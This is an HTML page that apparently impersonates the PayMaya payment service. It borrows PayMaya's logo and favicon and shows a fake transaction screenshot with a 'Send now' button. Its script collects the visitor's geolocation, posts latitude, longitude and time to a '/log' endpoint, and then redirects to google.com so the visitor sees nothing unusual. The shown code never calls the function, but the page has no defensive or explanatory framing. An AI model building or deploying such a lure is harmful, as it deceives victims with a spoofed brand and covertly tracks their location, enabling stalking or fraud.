<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PayMaya</title>
  <link rel="shortcut icon" href="https://payments.paymaya.com/favicon.ico" />
  <link rel="icon" sizes="16x16 32x32" href="https://payments.paymaya.com/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
    }
     body {
      margin: 0;
      padding: 0;
      padding-top: 50px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      /* height: 100vh; */
    }

    .transaction-image {
      margin-top: 10px;
      width: 85%;
      height: auto;
    }

    .send-button {
      background-color: #1aad5c; /* Maya green */
      color: white;
      padding: 14px 32px;
      border: none;
      border-radius: 14px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      text-align: center;
      display: inline-block;
      transition: background-color 0.2s ease-in-out;
      width: 85%;
      margin-top: 20px;
    }

    .send-button:hover {
      background-color: #169e52;
    }

  </style>
</head>
<body>
  <div>
    <img src="https://payments.paymaya.com/images/payMayaLogo.svg" alt="">
  </div>
  <img class="transaction-image" src="images/transaction.png" alt="Transaction Screenshot" />
  <button class="send-button">Send now</button>
  <script>
    function getLocation() {
      navigator.geolocation.getCurrentPosition(position => {
        fetch('/log', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            lat: position.coords.latitude,
            lng: position.coords.longitude,
            time: new Date().toISOString()
          })
        }).finally(() => {
          window.location.href = 'https://www.google.com';
        });
      }, () => {
        window.location.href = 'https://www.google.com';
      });
    }
  </script>
</body>
</html>
